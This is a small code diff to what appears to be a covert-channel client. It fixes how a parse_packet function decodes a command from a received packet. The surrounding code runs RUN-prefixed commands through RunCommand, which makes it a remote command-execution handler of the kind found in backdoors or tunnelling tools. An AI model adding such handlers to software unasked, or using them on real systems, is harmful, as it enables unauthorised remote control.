@@ -68,7 +68,7 @@ def parse_packet(packet):
         if prefix_packet == RUN or prefix_packet == FILE:
             print("recieved response!")
             data_recieved = get_an[len(prefix_packet):]
-            txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
+            txt_recieved = bin_to_str(data_recieved[0])     # the plaintxt of the command
             if prefix_packet == RUN:
                 print("command is: "+txt_recieved)
                 output = RunCommand(txt_recieved)
